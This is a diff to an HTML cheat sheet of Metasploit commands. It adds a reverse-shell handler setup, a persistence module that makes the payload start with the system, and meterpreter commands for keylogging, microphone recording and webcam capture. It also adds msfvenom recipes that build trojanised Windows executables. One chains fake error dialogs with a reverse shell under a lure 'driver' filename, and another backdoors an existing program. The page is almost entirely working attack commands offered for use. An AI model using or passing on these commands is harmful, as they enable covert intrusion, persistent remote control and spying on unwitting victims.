@@ -35,6 +35,63 @@ msfconsole
 
 <hr>
 
-Use reverse tcp shell
-<pre>set payload windows/meterpreter/reverse_tcp
+Use reverse tcp shell (full mini guide)
+<pre>msfconsole
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+        
+set LHOST 192.168.0.196
+set LPORT 4444
+        
+run
 </pre>
+Get any info about cerrent state
+<pre>
+info
+options
+</pre>
+Create autostart for payload
+<pre>run post/windows/manage/persistence_exe REXEPATH=/local/path/to/your/payload.exe REXENAME=default.exe STARTUP=SYSTEM
+</pre>
+
+<hr>
+
+<h2>meterpreter (reverse shell)</h2>
+Keylogger
+<pre>keyscan_start
+keyscan_dump
+</pre>
+Record audio
+<pre>record_mic
+</pre>
+Start webcam chat
+<pre>webcam_chat
+</pre>
+List webcams
+<pre>webcam_list
+</pre>
+Work with webcam
+<pre>webcam_snap
+webcam_stream
+</pre>
+
+<hr>
+
+<h2>msfvenom (payload tool)</h2>
+Create file with multipayloads
+<pre>msfvenom -p windows/messagebox ICON="INFORMATION" TITLE="Compatibility test" TEXT="The test is processed" -f raw -o mes1
+
+msfvenom -c mes1 -p windows/messagebox ICON="ERROR" TITLE="Error" TEXT="Missing necessary files" -f raw -o mes2
+        
+msfvenom -c mes2 -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=4444 -f exe -o driver_dlya_tvoego_computera.exe
+</pre>
+Another examples
+<pre>msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe
+
+msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.0.196 -f exe -o vnc.exe
+</pre>
+<b>-p</b> - payload <br>
+<b>-c</b> - merge in file (for multipayloads) <br>
+<b>-x</b> - template for execute file <br>
+<b>-k</b> - split threads for payload <br>
